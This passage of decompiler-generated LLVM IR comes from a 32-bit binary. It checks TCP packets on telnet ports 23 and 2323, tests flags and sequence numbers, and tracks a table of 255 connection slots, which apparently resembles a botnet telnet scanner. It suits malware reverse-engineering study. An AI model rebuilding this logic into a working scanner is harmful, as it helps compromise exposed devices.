  store i32 %v0_8050ce5, i32* %esi.global-to-local, align 4
  %v1_8050ceb = add i32 %v1_8050cd5, 58
  store i32 %v1_8050ceb, i32* %edx.global-to-local, align 4
  %v2_8050cef = add i32 %v1_8050cd5, -28
  %v3_8050cef = inttoptr i32 %v2_8050cef to i32*
  store i32 %v1_8050ceb, i32* %v3_8050cef, align 4
  %v0_8050cf0 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050cf0 = add i32 %v1_8050cd5, -32
  %v3_8050cf0 = inttoptr i32 %v2_8050cf0 to i32*
  store i32 %v0_8050cf0, i32* %v3_8050cf0, align 4
  %v0_8050cf1 = call i32 @function_8053281()
  store i32 %v0_8050cf1, i32* %eax.global-to-local, align 4
  %v0_8050cf6 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_8050cf1, 1
  br i1 %tmp, label %dec_label_pc_8050de0, label %dec_label_pc_8050d01

dec_label_pc_8050d01:                             ; preds = %dec_label_pc_8050ccb
  %v1_8050d01 = add i32 %v0_8050cf6, 72
  %v2_8050d01 = inttoptr i32 %v1_8050d01 to i32*
  %v3_8050d01 = load i32, i32* %v2_8050d01, align 4
  store i32 %v3_8050d01, i32* %ecx.global-to-local, align 4
  %v1_8050d05 = inttoptr i32 %v3_8050d01 to i32*
  %v2_8050d05 = load i32, i32* %v1_8050d05, align 4
  %v11_8050d05 = icmp eq i32 %v2_8050d05, 11
  br i1 %v11_8050d05, label %dec_label_pc_8050de0, label %dec_label_pc_8050d0e

dec_label_pc_8050d0e:                             ; preds = %dec_label_pc_8050d01
  %tmp295 = icmp ult i32 %v0_8050cf1, 40
  br i1 %tmp295, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d13

dec_label_pc_8050d13:                             ; preds = %dec_label_pc_8050d0e
  %v1_8050d13 = add i32 %v0_8050cf6, 106
  %v2_8050d13 = inttoptr i32 %v1_8050d13 to i32*
  %v3_8050d13 = load i32, i32* %v2_8050d13, align 4
  store i32 %v3_8050d13, i32* %eax.global-to-local, align 4
  %v1_8050d17 = load i32, i32* @global_var_80572dc.27, align 4
  %v12_8050d17 = icmp eq i32 %v3_8050d13, %v1_8050d17
  %v1_8050d1d = icmp eq i1 %v12_8050d17, false
  br i1 %v1_8050d1d, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d1f

dec_label_pc_8050d1f:                             ; preds = %dec_label_pc_8050d13
  %v1_8050d1f = add i32 %v0_8050cf6, 99
  %v2_8050d1f = inttoptr i32 %v1_8050d1f to i8*
  %v3_8050d1f = load i8, i8* %v2_8050d1f, align 1
  %v12_8050d1f = icmp eq i8 %v3_8050d1f, 6
  %v1_8050d24 = icmp eq i1 %v12_8050d1f, false
  br i1 %v1_8050d24, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d26

dec_label_pc_8050d26:                             ; preds = %dec_label_pc_8050d1f
  %v1_8050d26 = add i32 %v0_8050cf6, 110
  %v2_8050d26 = inttoptr i32 %v1_8050d26 to i32*
  %v3_8050d26 = load i32, i32* %v2_8050d26, align 4
  store i32 %v3_8050d26, i32* %esi.global-to-local, align 4
  %v1_8050d2a = trunc i32 %v3_8050d26 to i16
  %v7_8050d2a = icmp eq i16 %v1_8050d2a, 5888
  br i1 %v7_8050d2a, label %dec_label_pc_8050d38, label %dec_label_pc_8050d31

dec_label_pc_8050d31:                             ; preds = %dec_label_pc_8050d26
  %v10_8050d31 = icmp eq i16 %v1_8050d2a, 4873
  %v1_8050d36 = icmp eq i1 %v10_8050d31, false
  br i1 %v1_8050d36, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d38

dec_label_pc_8050d38:                             ; preds = %dec_label_pc_8050d31, %dec_label_pc_8050d26
  %v1_8050d38 = add i32 %v0_8050cf6, 54
  %v2_8050d38 = inttoptr i32 %v1_8050d38 to i16*
  %v3_8050d38 = load i16, i16* %v2_8050d38, align 2
  %v4_8050d38 = zext i16 %v3_8050d38 to i32
  %v6_8050d38 = and i32 %v3_8050d13, -65536
  %v7_8050d38 = or i32 %v4_8050d38, %v6_8050d38
  store i32 %v7_8050d38, i32* %eax.global-to-local, align 4
  %v3_8050d3d = add i32 %v0_8050cf6, 112
  %v4_8050d3d = inttoptr i32 %v3_8050d3d to i16*
  %v5_8050d3d = load i16, i16* %v4_8050d3d, align 2
  %v16_8050d3d = icmp eq i16 %v3_8050d38, %v5_8050d3d
  %v1_8050d42 = icmp eq i1 %v16_8050d3d, false
  br i1 %v1_8050d42, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d44

dec_label_pc_8050d44:                             ; preds = %dec_label_pc_8050d38
  %v1_8050d44 = add i32 %v0_8050cf6, 123
  %v2_8050d44 = inttoptr i32 %v1_8050d44 to i8*
  %v3_8050d44 = load i8, i8* %v2_8050d44, align 1
  %v4_8050d44 = zext i8 %v3_8050d44 to i32
  %v6_8050d44 = and i32 %v7_8050d38, -256
  %v7_8050d44 = or i32 %v4_8050d44, %v6_8050d44
  store i32 %v7_8050d44, i32* %eax.global-to-local, align 4
  %v2_8050d48 = and i8 %v3_8050d44, 2
  %v3_8050d48 = icmp eq i8 %v2_8050d48, 0
  br i1 %v3_8050d48, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d50

dec_label_pc_8050d50:                             ; preds = %dec_label_pc_8050d44
  %v2_8050d50 = and i32 %v4_8050d44, 16
  %v3_8050d50 = icmp eq i32 %v2_8050d50, 0
  br i1 %v3_8050d50, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d58

dec_label_pc_8050d58:                             ; preds = %dec_label_pc_8050d50
  %v2_8050d58 = and i32 %v4_8050d44, 4
  %v3_8050d58 = icmp eq i32 %v2_8050d58, 0
  %v1_8050d5a = icmp eq i1 %v3_8050d58, false
  br i1 %v1_8050d5a, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d60

dec_label_pc_8050d60:                             ; preds = %dec_label_pc_8050d58
  %tmp302 = urem i8 %v3_8050d44, 2
  %v3_8050d60 = icmp eq i8 %tmp302, 0
  %v1_8050d62 = icmp eq i1 %v3_8050d60, false
  br i1 %v1_8050d62, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d68

dec_label_pc_8050d68:                             ; preds = %dec_label_pc_8050d60
  %v1_8050d68 = add i32 %v0_8050cf6, 118
  %v2_8050d68 = inttoptr i32 %v1_8050d68 to i32*
  %v3_8050d68 = load i32, i32* %v2_8050d68, align 4
  %v1_8050d6c = trunc i32 %v3_8050d68 to i16
  %v2_8050d6c = call i16 @llvm.bswap.i16(i16 %v1_8050d6c)
  %v3_8050d6c = zext i16 %v2_8050d6c to i32
  %v1_8050d70 = udiv i32 %v3_8050d68, 65536
  %v2_8050d70 = mul nuw i32 %v3_8050d6c, 65536
  %v1_8050d73 = trunc i32 %v1_8050d70 to i16
  %v2_8050d73 = call i16 @llvm.bswap.i16(i16 %v1_8050d73)
  %v3_8050d73 = zext i16 %v2_8050d73 to i32
  %v6_8050d73 = or i32 %v3_8050d73, %v2_8050d70
  store i32 %v6_8050d73, i32* %eax.global-to-local, align 4
  %v1_8050d77 = add i32 %v6_8050d73, -1
  %v1_8050d7a = trunc i32 %v1_8050d77 to i16
  %v2_8050d7a = call i16 @llvm.bswap.i16(i16 %v1_8050d7a)
  %v3_8050d7a = zext i16 %v2_8050d7a to i32
  %v1_8050d7e = udiv i32 %v1_8050d77, 65536
  %v2_8050d7e = mul nuw i32 %v3_8050d7a, 65536
  %v1_8050d81 = trunc i32 %v1_8050d7e to i16
  %v2_8050d81 = call i16 @llvm.bswap.i16(i16 %v1_8050d81)
  %v3_8050d81 = zext i16 %v2_8050d81 to i32
  %v6_8050d81 = or i32 %v3_8050d81, %v2_8050d7e
  store i32 %v6_8050d81, i32* %edx.global-to-local, align 4
  %v1_8050d85 = add i32 %v0_8050cf6, 102
  %v2_8050d85 = inttoptr i32 %v1_8050d85 to i32*
  %v3_8050d85 = load i32, i32* %v2_8050d85, align 4
  %v15_8050d85 = icmp eq i32 %v3_8050d85, %v6_8050d81
  %v1_8050d89 = icmp eq i1 %v15_8050d85, false
  br i1 %v1_8050d89, label %dec_label_pc_8050ccb, label %dec_label_pc_8050d8f

dec_label_pc_8050d8f:                             ; preds = %dec_label_pc_8050d68
  %v0_8050d8f = load i32, i32* @ebx, align 4
  %v1_8050d8f = add i32 %v0_8050d8f, -255
  %v6_8050d8f = sub i32 254, %v0_8050d8f
  %v7_8050d8f = and i32 %v6_8050d8f, %v0_8050d8f
  %v8_8050d8f = icmp slt i32 %v7_8050d8f, 0
  %v9_8050d8f = icmp eq i32 %v1_8050d8f, 0
  %v10_8050d8f = icmp slt i32 %v1_8050d8f, 0
  %v3_8050d95 = icmp eq i1 %v10_8050d8f, %v8_8050d8f
  %v4_8050d95 = icmp eq i1 %v9_8050d8f, false
  %v5_8050d95 = and i1 %v4_8050d95, %v3_8050d95
  br i1 %v5_8050d95, label %dec_label_pc_8050de0, label %dec_label_pc_8050d97

dec_label_pc_8050d97:                             ; preds = %dec_label_pc_8050d8f
  %v0_8050d9a = load i32, i32* @global_var_80572f8.45, align 8
  store i32 %v0_8050d9a, i32* %ecx.global-to-local, align 4
  %v2_8050da0 = mul i32 %v0_8050d8f, 288
  %v2_8050da3 = add i32 %v0_8050d9a, %v2_8050da0
  store i32 %v2_8050da3, i32* @eax, align 4
  %v1_8050da5 = add i32 %v2_8050da3, 12
  %v2_8050da5 = inttoptr i32 %v1_8050da5 to i32*
  %v3_8050da5 = load i32, i32* %v2_8050da5, align 4
  %v1_8050da8 = add i32 %v2_8050da3, 288
  store i32 %v1_8050da8, i32* %ecx.global-to-local, align 4
  %v1_8050dae = icmp eq i32 %v3_8050da5, 0
  br i1 %v1_8050dae, label %dec_label_pc_8050dca, label %dec_label_pc_8050db2

dec_label_pc_8050db2:                             ; preds = %dec_label_pc_8050d97, %dec_label_pc_8050dbb
  %v0_8050dbb = phi i32 [ %v1_8050dbd, %dec_label_pc_8050dbb ], [ %v1_8050da8, %dec_label_pc_8050d97 ]
  %v0_8050db2 = phi i32 [ %v1_8050db2, %dec_label_pc_8050dbb ], [ %v0_8050d8f, %dec_label_pc_8050d97 ]
  %v1_8050db2 = add i32 %v0_8050db2, 1
  store i32 %v1_8050db2, i32* @ebx, align 4
  %v6_8050db3 = icmp eq i32 %v0_8050db2, 255
  br i1 %v6_8050db3, label %dec_label_pc_8050de0.loopexit, label %dec_label_pc_8050dbb

dec_label_pc_8050dbb:                             ; preds = %dec_label_pc_8050db2
  store i32 %v0_8050dbb, i32* @eax, align 4
  %v1_8050dbd = add i32 %v0_8050dbb, 288
  store i32 %v1_8050dbd, i32* %ecx.global-to-local, align 4
  %v1_8050dc3 = add i32 %v0_8050dbb, 12
  %v2_8050dc3 = inttoptr i32 %v1_8050dc3 to i32*
  %v3_8050dc3 = load i32, i32* %v2_8050dc3, align 4
  store i32 %v3_8050dc3, i32* @edi, align 4
  %v1_8050dc6 = icmp eq i32 %v3_8050dc3, 0
  %v1_8050dc8 = icmp eq i1 %v1_8050dc6, false
  br i1 %v1_8050dc8, label %dec_label_pc_8050db2, label %dec_label_pc_8050dca.loopexit

dec_label_pc_8050dca.loopexit:                    ; preds = %dec_label_pc_8050dbb
  br label %dec_label_pc_8050dca

dec_label_pc_8050dca:                             ; preds = %dec_label_pc_8050dca.loopexit, %dec_label_pc_8050d97
  %v1_8050dca = phi i32 [ %v0_8050dbb, %dec_label_pc_8050dca.loopexit ], [ %v2_8050da3, %dec_label_pc_8050d97 ]
  %v2_8050dca = add i32 %v1_8050dca, 16
  %v3_8050dca = inttoptr i32 %v2_8050dca to i32*
  store i32 %v6_8050d81, i32* %v3_8050dca, align 4
  %v0_8050dcd = load i32, i32* %esi.global-to-local, align 4
  %v1_8050dcd = trunc i32 %v0_8050dcd to i16
  %v2_8050dcd = load i32, i32* @eax, align 4
  %v3_8050dcd = add i32 %v2_8050dcd, 20
  %v4_8050dcd = inttoptr i32 %v3_8050dcd to i16*
  store i16 %v1_8050dcd, i16* %v4_8050dcd, align 2
  %v0_8050dd1 = call i32 @function_8050190()
  store i32 %v0_8050dd1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ccb

dec_label_pc_8050de0.loopexit:                    ; preds = %dec_label_pc_8050db2
  br label %dec_label_pc_8050de0

dec_label_pc_8050de0:                             ; preds = %dec_label_pc_8050d8f, %dec_label_pc_8050d01, %dec_label_pc_8050ccb, %dec_label_pc_8050de0.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_8050de9 = add i32 %v0_8050cf6, 44
  %v2_8050de9 = inttoptr i32 %v1_8050de9 to i32*
  %v3_8050de9 = load i32, i32* %v2_8050de9, align 4
  %v4_8050de9 = inttoptr i32 %v3_8050de9 to i8*
  %v5_8050dee = call i8* @_memset(i8* %v4_8050de9, i32 0, i32 32)
  %v0_8050df0 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050df0, i32* %ecx.global-to-local, align 4
  %v0_8050df2 = load i32, i32* @esp, align 4
  %v1_8050df2 = add i32 %v0_8050df2, 8
  %v2_8050df2 = inttoptr i32 %v1_8050df2 to i32*
  %v3_8050df2 = load i32, i32* %v2_8050df2, align 4
  %v4_8050df2 = inttoptr i32 %v3_8050df2 to i8*
  store i1 false, i1* @df, align 1
  %v2_8050df7 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050df7 = call i8* @_memset(i8* %v4_8050df2, i32 %v2_8050df7, i32 %v0_8050df0)
  %v6_8050df7 = ptrtoint i8* %v5_8050df7 to i32
  store i32 %v6_8050df7, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_8050dfb = load i32, i32* @esp, align 4
  %v1_8050dfb = add i32 %v0_8050dfb, 1868
  %v2_8050dfb = inttoptr i32 %v1_8050dfb to i32*
  store i32 0, i32* %v2_8050dfb, align 4
  store i32 0, i32* @esi, align 4
  %v0_8050e08.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e08

dec_label_pc_8050e08:                             ; preds = %dec_label_pc_8050e5b, %dec_label_pc_8050de0
  %v0_8050e08 = phi i32 [ %v0_8050e6a, %dec_label_pc_8050e5b ], [ %v0_8050e08.pre, %dec_label_pc_8050de0 ]
  %v0_8050e0b = load i32, i32* @global_var_80572f8.45, align 8
  store i32 %v0_8050e0b, i32* %eax.global-to-local, align 4
  %v2_8050e10 = mul i32 %v0_8050e08, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_8050e18 = add i32 %v0_8050e0b, %v2_8050e10
  store i32 %v2_8050e18, i32* @ebx, align 4
  %v1_8050e1a = add i32 %v2_8050e18, 12
  %v2_8050e1a = inttoptr i32 %v1_8050e1a to i32*
  %v3_8050e1a = load i32, i32* %v2_8050e1a, align 4
  store i32 %v3_8050e1a, i32* %edx.global-to-local, align 4
  %v1_8050e1d = add i32 %v3_8050e1a, -1
  %v5_8050e1d = icmp eq i32 %v3_8050e1a, 0
  %v9_8050e1d = icmp eq i32 %v1_8050e1d, 0
  %v2_8050e20 = or i1 %v5_8050e1d, %v9_8050e1d
  br i1 %v2_8050e20, label %dec_label_pc_80519c2, label %dec_label_pc_8050e26

dec_label_pc_8050e26:                             ; preds = %dec_label_pc_8050e08, %dec_label_pc_80519ca
  %v1_8050e30 = phi i32 [ 30, %dec_label_pc_8050e08 ], [ 5, %dec_label_pc_80519ca ]
  %v0_8050e26 = load i32, i32* @global_var_80572b0.34, align 16
  store i32 %v0_8050e26, i32* %eax.global-to-local, align 4
  %v1_8050e2b = add i32 %v2_8050e18, 8
  %v2_8050e2b = inttoptr i32 %v1_8050e2b to i32*
  %v3_8050e2b = load i32, i32* %v2_8050e2b, align 4
  %v2_8050e2e = sub i32 %v0_8050e26, %v3_8050e2b
  store i32 %v2_8050e2e, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_8050e2e, %v1_8050e30
  br i1 %tmp296, label %dec_label_pc_8051960, label %dec_label_pc_8050e38

dec_label_pc_8050e38:                             ; preds = %dec_label_pc_8050e26
  store i32 %v1_8050e1d, i32* %edx.global-to-local, align 4
  %v1_8051935 = add i32 %v2_8050e18, 4
  %v2_8051935 = inttoptr i32 %v1_8051935 to i32*
  %v3_8051935 = load i32, i32* %v2_8051935, align 4
  %v1_805193a = urem i32 %v3_8051935, 32
  store i32 %v1_805193a, i32* %eax.global-to-local, align 4
  %v2_805193d = udiv i32 %v3_8051935, 32
  store i32 %v2_805193d, i32* %edx.global-to-local, align 4
  %v0_8051940 = load i32, i32* @esp, align 4
  %v2_8051940 = mul nuw nsw i32 %v2_805193d, 4
  br i1 %v9_8050e1d, label %dec_label_pc_8051935, label %dec_label_pc_8050e3f

dec_label_pc_8050e3f:                             ; preds = %dec_label_pc_8050e38
  %v3_8050e4a = add nuw nsw i32 %v2_8051940, 1700
  %v4_8050e4a = add i32 %v3_8050e4a, %v0_8051940
  %v5_8050e4a = inttoptr i32 %v4_8050e4a to i32*
  %v6_8050e4a = load i32, i32* %v5_8050e4a, align 4
  %v9_8050e4a = shl i32 1, %v1_805193a
  %v12_8050e4a = or i32 %v6_8050e4a, %v9_8050e4a
  store i32 %v12_8050e4a, i32* %v5_8050e4a, align 4
  %v0_8050e52 = load i32, i32* @ebx, align 4
  %v1_8050e52 = add i32 %v0_8050e52, 4
  %v2_8050e52 = inttoptr i32 %v1_8050e52 to i32*
  %v3_8050e52 = load i32, i32* %v2_8050e52, align 4
  store i32 %v3_8050e52, i32* %eax.global-to-local, align 4
  %v0_8050e55 = load i32, i32* @edi, align 4
  %v2_8050e55 = sub i32 %v0_8050e55, %v3_8050e52
  %v8_8050e55 = xor i32 %v0_8050e55, %v3_8050e52
  %v9_8050e55 = xor i32 %v2_8050e55, %v0_8050e55
  %v10_8050e55 = and i32 %v9_8050e55, %v8_8050e55
  %v11_8050e55 = icmp slt i32 %v10_8050e55, 0
  %v13_8050e55 = icmp slt i32 %v2_8050e55, 0
  %v2_8050e57 = icmp eq i1 %v13_8050e55, %v11_8050e55
  br i1 %v2_8050e57, label %dec_label_pc_8050e5b, label %dec_label_pc_8050e59

dec_label_pc_8050e59:                             ; preds = %dec_label_pc_8050e3f
  store i32 %v3_8050e52, i32* @edi, align 4
  br label %dec_label_pc_8050e5b

dec_label_pc_8050e5b:                             ; preds = %dec_label_pc_80519c2, %dec_label_pc_8051935, %dec_label_pc_8050e3f, %dec_label_pc_80519af, %dec_label_pc_805198d, %dec_label_pc_8051953, %dec_label_pc_8050e59
  %v0_8050e5b = load i32, i32* @esp, align 4
  %v1_8050e5b = add i32 %v0_8050e5b, 1868
  %v2_8050e5b = inttoptr i32 %v1_8050e5b to i32*
  %v3_8050e5b = load i32, i32* %v2_8050e5b, align 4
  %v1_8050e62 = add i32 %v3_8050e5b, 1
  store i32 %v1_8050e62, i32* %eax.global-to-local, align 4
  store i32 %v1_8050e62, i32* %v2_8050e5b, align 4
  %v0_8050e6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e6a = add i32 %v0_8050e6a, -255
  %v6_8050e6a = sub i32 254, %v0_8050e6a
  %v7_8050e6a = and i32 %v6_8050e6a, %v0_8050e6a
  %v8_8050e6a = icmp slt i32 %v7_8050e6a, 0
  %v9_8050e6a = icmp eq i32 %v1_8050e6a, 0
  %v10_8050e6a = icmp slt i32 %v1_8050e6a, 0
  %v3_8050e6f = icmp ne i1 %v10_8050e6a, %v8_8050e6a
  %v4_8050e6f = or i1 %v9_8050e6a, %v3_8050e6f
  br i1 %v4_8050e6f, label %dec_label_pc_8050e08, label %dec_label_pc_8050e71

dec_label_pc_8050e71:                             ; preds = %dec_label_pc_8050e5b
  %v0_8050e71 = load i32, i32* @esp, align 4
  %v1_8050e71 = add i32 %v0_8050e71, 1860
  %v2_8050e71 = inttoptr i32 %v1_8050e71 to i32*
  store i32 0, i32* %v2_8050e71, align 4
  %v0_8050e7c = load i32, i32* @esp, align 4
  %v1_8050e7c = add i32 %v0_8050e7c, 1856
  %v2_8050e7c = inttoptr i32 %v1_8050e7c to i32*
  store i32 1, i32* %v2_8050e7c, align 4
  %v0_8050e87 = load i32, i32* @esp, align 4
  %v0_8050e8a = load i32, i32* @edi, align 4
  %v1_8050e8a = load i32, i32* @esi, align 4
  %v2_8050e8a = sub i32 %v0_8050e8a, %v1_8050e8a
  %v8_8050e8a = xor i32 %v1_8050e8a, %v0_8050e8a
  %v9_8050e8a = xor i32 %v2_8050e8a, %v0_8050e8a
  %v10_8050e8a = and i32 %v9_8050e8a, %v8_8050e8a
  %v11_8050e8a = icmp slt i32 %v10_8050e8a, 0
  %v13_8050e8a = icmp slt i32 %v2_8050e8a, 0
  %v1_8050e8c = add i32 %v0_8050e87, 1856
  %v2_8050e93 = add i32 %v0_8050e87, -16
  %v3_8050e93 = inttoptr i32 %v2_8050e93 to i32*
  store i32 %v1_8050e8c, i32* %v3_8050e93, align 4
  %v1_8050e94 = add i32 %v0_8050e87, -20
  %v2_8050e94 = inttoptr i32 %v1_8050e94 to i32*
  store i32 0, i32* %v2_8050e94, align 4
  %v1_8050e96 = add i32 %v0_8050e87, 1572
  store i32 %v1_8050e96, i32* %edx.global-to-local, align 4
  %v0_8050e9d = load i32, i32* @edi, align 4
  store i32 %v0_8050e9d, i32* %eax.global-to-local, align 4
  %v2_8050e9f = add i32 %v0_8050e87, -24
  %v3_8050e9f = inttoptr i32 %v2_8050e9f to i32*
  store i32 %v1_8050e96, i32* %v3_8050e9f, align 4
  %v1_8050ea0 = add i32 %v0_8050e87, 1700
  store i32 %v1_8050ea0, i32* %ecx.global-to-local, align 4
  %v2_8050ea7 = add i32 %v0_8050e87, -28
  %v3_8050ea7 = inttoptr i32 %v2_8050ea7 to i32*
  store i32 %v1_8050ea0, i32* %v3_8050ea7, align 4
  %v2_8050ea8 = icmp eq i1 %v13_8050e8a, %v11_8050e8a
  br i1 %v2_8050ea8, label %dec_label_pc_8050e71.dec_label_pc_8050eac_crit_edge, label %dec_label_pc_8050eaa

dec_label_pc_8050e71.dec_label_pc_8050eac_crit_edge: ; preds = %dec_label_pc_8050e71
  %v0_8050eac.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eac

dec_label_pc_8050eaa:                             ; preds = %dec_label_pc_8050e71
  %v0_8050eaa = load i32, i32* @esi, align 4
  store i32 %v0_8050eaa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eac

dec_label_pc_8050eac:                             ; preds = %dec_label_pc_8050e71.dec_label_pc_8050eac_crit_edge, %dec_label_pc_8050eaa
  %v0_8050eac = phi i32 [ %v0_8050eac.pre, %dec_label_pc_8050e71.dec_label_pc_8050eac_crit_edge ], [ %v0_8050eaa, %dec_label_pc_8050eaa ]
  %v1_8050eac = add i32 %v0_8050eac, 1
  store i32 %v1_8050eac, i32* %eax.global-to-local, align 4
  %v2_8050ead = add i32 %v0_8050e87, -32
  %v3_8050ead = inttoptr i32 %v2_8050ead to i32*
  store i32 %v1_8050eac, i32* %v3_8050ead, align 4
  %v0_8050eae = call i32 @function_8052d88()
  store i32 %v0_8050eae, i32* %eax.global-to-local, align 4
  %v0_8050eb3 = load i32, i32* @esp, align 4
  %v1_8050eb6 = add i32 %v0_8050eb3, 16
  %v2_8050eb6 = inttoptr i32 %v1_8050eb6 to i32*
  store i32 0, i32* %v2_8050eb6, align 4
  %v2_8050eb8 = call i32 @function_8052e42(i32* nonnull @0)
  %v0_8050ebd = load i32, i32* @esp, align 4
  %v1_8050ebd = add i32 %v0_8050ebd, 1884
  %v2_8050ebd = inttoptr i32 %v1_8050ebd to i32*
  store i32 0, i32* %v2_8050ebd, align 4
  store i32 %v2_8050eb8, i32* @global_var_80572b0.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ed2

dec_label_pc_8050ed2:                             ; preds = %dec_label_pc_8050f1b, %dec_label_pc_8050eac
  %v0_8050ed2 = phi i32 [ %v0_8050f2a, %dec_label_pc_8050f1b ], [ 0, %dec_label_pc_8050eac ]
  %v0_8050ed5 = load i32, i32* @global_var_80572f8.45, align 8
  store i32 %v0_8050ed5, i32* %eax.global-to-local, align 4
  %v2_8050eda = mul i32 %v0_8050ed2, 288
  %v2_8050edd = add i32 %v0_8050ed5, %v2_8050eda
  store i32 %v2_8050edd, i32* @edi, align 4
  %v1_8050edf = add i32 %v2_8050edd, 4
  %v2_8050edf = inttoptr i32 %v1_8050edf to i32*
  %v3_8050edf = load i32, i32* %v2_8050edf, align 4
  store i32 %v3_8050edf, i32* %ecx.global-to-local, align 4
  %v10_8050ee2 = icmp eq i32 %v3_8050edf, -1
  br i1 %v10_8050ee2, label %dec_label_pc_8050f1b, label %dec_label_pc_8050ee7

dec_label_pc_8050ee7:                             ; preds = %dec_label_pc_8050ed2
  %v2_8050eeb = udiv i32 %v3_8050edf, 32
  store i32 %v2_8050eeb, i32* %edx.global-to-local, align 4
  %v1_8050eee = urem i32 %v3_8050edf, 32
  store i32 %v1_8050eee, i32* %eax.global-to-local, align 4
  %v0_8050ef1 = load i32, i32* @esp, align 4
  %v2_8050ef1 = mul nuw nsw i32 %v2_8050eeb, 4
  %v3_8050ef1 = add nuw nsw i32 %v2_8050ef1, 1572
  %v4_8050ef1 = add i32 %v3_8050ef1, %v0_8050ef1
  %v5_8050ef1 = inttoptr i32 %v4_8050ef1 to i32*
  %v6_8050ef1 = load i32, i32* %v5_8050ef1, align 4
  %v9_8050ef1 = shl i32 1, %v1_8050eee
  %v10_8050ef1 = and i32 %v6_8050ef1, %v9_8050ef1
  %v11_8050ef1 = icmp ne i32 %v10_8050ef1, 0
  %v1_8050ef9 = zext i1 %v11_8050ef1 to i32
  store i32 %v1_8050ef9, i32* %eax.global-to-local, align 4
  %v4_8050efc = icmp eq i1 %v11_8050ef1, false
  %v1_8050efe = icmp eq i1 %v4_8050efc, false
  br i1 %v1_8050efe, label %dec_label_pc_805186b, label %dec_label_pc_8050f04

dec_label_pc_8050f04:                             ; preds = %dec_label_pc_8050ee7, %dec_label_pc_80518fb
  %v0_8050f0c = phi i32 [ %v0_8050ef1, %dec_label_pc_8050ee7 ], [ %v0_8050f0c.pre, %dec_label_pc_80518fb ]
  %v0_8050f04 = phi i32 [ %v3_8050edf, %dec_label_pc_8050ee7 ], [ %v0_8050f04.pre, %dec_label_pc_80518fb ]
  %v2_8050f06 = udiv i32 %v0_8050f04, 32
  store i32 %v2_8050f06, i32* %ecx.global-to-local, align 4
  %v1_8050f09 = urem i32 %v0_8050f04, 32
  store i32 %v1_8050f09, i32* %eax.global-to-local, align 4
  %v2_8050f0c = mul nuw nsw i32 %v2_8050f06, 4
  %v3_8050f0c = add i32 %v0_8050f0c, 1700
  %v4_8050f0c = add i32 %v3_8050f0c, %v2_8050f0c
  %v5_8050f0c = inttoptr i32 %v4_8050f0c to i32*
  %v6_8050f0c = load i32, i32* %v5_8050f0c, align 4
  %v9_8050f0c = shl i32 1, %v1_8050f09
  %v10_8050f0c = and i32 %v6_8050f0c, %v9_8050f0c
  %v11_8050f0c = icmp ne i32 %v10_8050f0c, 0
  %v1_8050f14 = zext i1 %v11_8050f0c to i32
  store i32 %v1_8050f14, i32* %eax.global-to-local, align 4
  %v4_8050f17 = icmp eq i1 %v11_8050f0c, false
  %v1_8050f19 = icmp eq i1 %v4_8050f17, false
  br i1 %v1_8050f19, label %dec_label_pc_8050f72.preheader, label %dec_label_pc_8050f1b

dec_label_pc_8050f72.preheader:                   ; preds = %dec_label_pc_8050f04
  %v0_8050f7227 = load i32, i32* @edi, align 4
  %v1_8050f7228 = add i32 %v0_8050f7227, 12
  %v2_8050f7229 = inttoptr i32 %v1_8050f7228 to i32*
  %v3_8050f7230 = load i32, i32* %v2_8050f7229, align 4
  store i32 %v3_8050f7230, i32* %eax.global-to-local, align 4
  %v1_8050f7531 = icmp eq i32 %v3_8050f7230, 0
  br i1 %v1_8050f7531, label %dec_label_pc_8050f1b, label %dec_label_pc_8050f79

dec_label_pc_8050f1b:                             ; preds = %dec_label_pc_8050f72.backedge, %dec_label_pc_8050f72.preheader, %dec_label_pc_80514db, %dec_label_pc_8050f04, %dec_label_pc_8050ed2, %dec_label_pc_80519e7, %dec_label_pc_805190c, %dec_label_pc_8051513
  %v0_8050f1b = load i32, i32* @esp, align 4
  %v1_8050f1b = add i32 %v0_8050f1b, 1868
  %v2_8050f1b = inttoptr i32 %v1_8050f1b to i32*
  %v3_8050f1b = load i32, i32* %v2_8050f1b, align 4
  %v1_8050f22 = add i32 %v3_8050f1b, 1
  store i32 %v1_8050f22, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f22, i32* %v2_8050f1b, align 4
  %v0_8050f2a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f2a = add i32 %v0_8050f2a, -255
  %v6_8050f2a = sub i32 254, %v0_8050f2a
  %v7_8050f2a = and i32 %v6_8050f2a, %v0_8050f2a
  %v8_8050f2a = icmp slt i32 %v7_8050f2a, 0
  %v9_8050f2a = icmp eq i32 %v1_8050f2a, 0
  %v10_8050f2a = icmp slt i32 %v1_8050f2a, 0
  %v3_8050f2f = icmp ne i1 %v10_8050f2a, %v8_8050f2a
  %v4_8050f2f = or i1 %v9_8050f2a, %v3_8050f2f
  br i1 %v4_8050f2f, label %dec_label_pc_8050ed2, label %dec_label_pc_8050f31

dec_label_pc_8050f36:                             ; preds = %dec_label_pc_8050fe4
  %v1_8050f36 = add i32 %v0_8050fe4, 24
  %v2_8050f36 = inttoptr i32 %v1_8050f36 to i32*
  %v3_8050f36 = load i32, i32* %v2_8050f36, align 4
  %v1_8050f39 = add i32 %v3_8050f36, -1
